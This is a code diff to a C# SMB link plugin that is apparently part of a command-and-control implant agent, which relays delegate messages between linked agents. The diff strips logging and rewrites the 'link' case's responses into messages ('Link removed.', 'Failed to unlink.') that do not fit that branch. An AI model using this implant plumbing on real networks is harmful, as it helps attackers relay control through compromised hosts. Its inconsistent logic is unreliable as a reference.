@@ -24,7 +24,6 @@ namespace Agent
         public async Task Execute(ServerJob job)
         {
             SmbLinkArgs args = JsonSerializer.Deserialize<SmbLinkArgs>(job.task.parameters);
-
             if (args is null)
             {
                 await messageManager.AddResponse(new ResponseResult()
@@ -37,8 +36,6 @@ namespace Agent
                 return;
             }
 
-            logger.Log("Starting SMB Plugin.");
-            logger.Log(job.task.parameters);
             switch (args.action)
             {
                 case "link":
@@ -50,15 +47,22 @@ namespace Agent
                         await this.messageManager.AddResponse(new ResponseResult()
                         {
                             task_id = job.task.id,
-                            user_output = "Link already exists.",
+                            user_output = "Link removed.",
+                            status = "error",
+                            completed = true,
+                        });
+                    }
+                    else
+                    {
+                        await this.messageManager.AddResponse(new ResponseResult()
+                        {
+                            task_id = job.task.id,
+                            user_output = "Failed to unlink.",
                             status = "error",
                             completed = true,
                         });
 
-                        //Return a success message.
                     }
-
-                    //Return a failure message.
                     break;
                 case "list":
                     await ListConnections(job);
@@ -77,9 +81,7 @@ namespace Agent
             if(this.tempForwarders.TryAdd(linkId, link))
             {
                 EdgeResponseResult err = await this.tempForwarders[linkId].Link();
-                logger.Log(err.ToJson());
                 await this.messageManager.AddResponse(err.ToJson());
-                logger.Log("Added Response, returning.");
                 return;
             }
 
@@ -100,7 +102,6 @@ namespace Agent
 
         public async Task ForwardDelegate(DelegateMessage dm)
         {
-            logger.Log("Forwarding Delegate");
             string id = dm.uuid;
             if (!string.IsNullOrEmpty(dm.new_uuid))
             {
@@ -119,7 +120,6 @@ namespace Agent
             }
 
             await this.forwarders[id].ForwardDelegateMessage(dm);
-            logger.Log("Delegate Forwarded");
         }
 
         public async Task ListConnections(ServerJob job)
